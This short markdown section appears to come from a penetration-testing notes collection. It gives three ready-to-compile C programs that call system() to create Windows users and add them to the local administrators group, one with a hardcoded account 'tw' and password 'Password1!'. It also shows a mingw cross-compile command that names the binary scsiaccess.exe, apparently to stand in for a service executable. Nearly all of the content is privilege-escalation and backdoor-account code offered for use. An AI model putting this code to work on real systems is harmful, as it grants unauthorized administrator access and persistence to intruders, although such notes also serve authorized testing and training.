## Source code that can be used


**FOR MORE ON COMPILATION SEE** [vulns_and_exploits/compilation.md](vulns_and_exploits/compilation.md)

* Add a user with C
  ```
  # cat useradd.c
  #include <stdlib.h> /* system, NULL, EXIT_FAILURE */
  int main () {
  int i;
  i=system ("net localgroup administrators low /add"); return 0;
  }

  root@kali:~# i586-mingw32msvc-gcc -o scsiaccess.exe useradd.c
  ```

* Another C file to create a new user:
  ```
  #include <stdio.h>
  #include <windows.h>

  int main()
  {
          system("cmd /c net user tw Password1! /add");
          system("cmd /c net localgroup administrators tw /add");
  }
  ```
  "i used mingw on osx (brew install mingw-w64) to cross-compile it"

* POC for getsuid:
  ```
  #include <stdlib.h>
  int main ()
  {
  int i;
      i = system("net localgroup administrators theusername /add");
  return 0;
  }
  ```
